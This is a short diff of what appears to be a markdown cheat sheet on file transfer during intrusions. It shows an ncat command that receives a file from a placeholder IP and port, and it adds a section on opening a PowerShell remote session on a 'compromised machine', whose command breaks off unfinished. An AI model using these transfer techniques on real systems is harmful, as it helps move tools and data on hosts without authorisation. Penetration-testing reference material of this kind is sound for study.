@@ -60,4 +60,7 @@ ncat <IP> <PORT> --recv-only > <FILE>
 ---
 ## Power shell Session File Transfer
 
-
+#### 1) Create Remote Session on Compromised machine
+```powershell
+$Session = new-PSSession -
+```
